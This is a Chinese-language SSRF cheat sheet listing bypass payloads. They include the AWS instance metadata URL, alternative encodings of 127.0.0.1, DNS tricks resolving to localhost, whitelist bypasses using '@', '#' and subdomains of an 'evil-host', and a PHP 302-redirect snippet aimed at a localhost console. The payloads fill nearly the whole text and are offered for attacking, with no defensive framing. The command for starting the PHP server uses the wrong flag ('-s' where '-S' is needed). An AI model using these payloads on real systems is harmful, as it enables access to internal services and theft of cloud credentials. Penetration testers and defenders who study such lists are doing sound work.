- [SSRF-Cheatsheet](#ssrf-cheatsheet)
    - [AWS](#aws)
    - [进制转换](#进制转换)
    - [域名欺骗](#域名欺骗)
    - [编码大小写](#编码大小写)
    - [`@`绕过](#绕过)
    - [`#`绕过](#绕过-1)
    - [白名单子域名](#白名单子域名)
    - [302重定向](#302重定向)
    - [短地址](#短地址)
# SSRF-Cheatsheet
### AWS
URL:http://169.254.169.254/user-data/
### 进制转换
127.0.0.1 -> 2130706433 -> 017700000001 -> 127.1
### 域名欺骗
将恶意域名的ip解析为127.0.0.1。Tools:spoofed.burpcollaborator.net
### 编码大小写
将关键字符url编码或大小写混淆。
### `@`绕过
一些白名单中只是匹配了url的起始或者是否包含某些白名单关键字,可以使用url的一些来绕过.
* 通过RFC标准,url`@`前面的部分将会被视为用户密码,而`@`后面的部分才会被视为目标服务器. 
`https://whitelist-host@evil-host`
### `#`绕过
* 通过`#`锚点在恶意host中加入白名单host.
`https://evil-host#whitelist-host`
### 白名单子域名
在自己的域名下注册一个白名单host的恶意子域名.
* `https://whitelist-host.evil-host`
### 302重定向
因为很多防御措施都是在请求前对路径进行过滤和检测,如果该SSRF漏洞后端支持重定向的话则可以利用重定向来绕过很多黑名单,如果应用自身就存在Openredirection漏洞的话也可以绕过大部分白名单,先请求一个合法的远程服务器,通过控制远程服务器返回302状态码在location Header来再次请求任意地址.  

php快速搭建302跳转服务器,默认执行-t指定目录下的index.php.  
`php -s localhost:80 -t ./`  
```php
<?php
Header('Location: http://localhost:8080/console')
?>
```
### 短地址
百度短地址等等